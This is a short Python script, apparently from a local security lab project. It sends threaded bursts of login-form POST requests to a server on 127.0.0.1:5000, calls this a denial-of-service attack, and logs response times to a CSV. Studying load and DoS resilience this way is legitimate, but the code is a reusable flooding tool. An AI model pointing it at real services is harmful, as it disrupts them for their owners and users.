import csv
import os
import threading
import time

import requests


def dos_request(url, payload, headers):

    num_requests = 1000
    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    output_file = os.path.join(project_root, "Resource_Usage")
    # create a folder to store resource usage data
    if not os.path.exists(output_file):
        os.makedirs(output_file)

    # open the file in write mode
    with open(
        os.path.join(output_file, "attack_response_time.csv"), "w", encoding="utf-8"
    ) as f:
        writer = csv.writer(f)
        # write the header
        writer.writerow(["timestamp", "status_code", "response_time"])

    while num_requests > 0:
        try:
            # record the start time
            start_time = time.time()
            response = requests.request(
                "POST", url, headers=headers, data=payload, timeout=2
            )
            # record the end time
            end_time = time.time()
            # calculate the time taken for the request
            time_taken = (end_time - start_time) * 1000  # convert to milliseconds
            # write the data to the file
            with open(
                os.path.join(output_file, "attack_response_time.csv"),
                "a",
                encoding="utf-8",
                newline="",
            ) as f:
                writer = csv.writer(f)
                # write the data
                writer.writerow([time.time(), response.status_code, time_taken])
            print(f"Sending DoS request, Status Code: {response.status_code}")
            time.sleep(0.5)  # Adjust the sleep time as needed 0.1 seconds
            num_requests -= 1
        except Exception as e:
            print(f"An Error Occurred: {e}")
            break


def Dos_attack():

    # target url (local host) for DoS attack
    url = "http://127.0.0.1:5000/"

    # email and password payload
    payload = "email=dos_attack&password=dos_attack"

    # headers for the request
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://127.0.0.1:5000",
        "Referer": "http://127.0.0.1:5000/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Microsoft Edge";v="134"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    # number of threads for the attack
    multi_thread = 3
    thread_list = []

    # begin the DoS attack
    print("Starting DoS attack...")

    for i in range(multi_thread):
        thread = threading.Thread(target=dos_request, args=(url, payload, headers))
        thread.start()
        thread_list.append(thread)
        time.sleep(3)

    for thread in thread_list:
        thread.join()


if __name__ == "__main__":
    # start the DoS attack
    Dos_attack()
    print("DoS attack finished.")
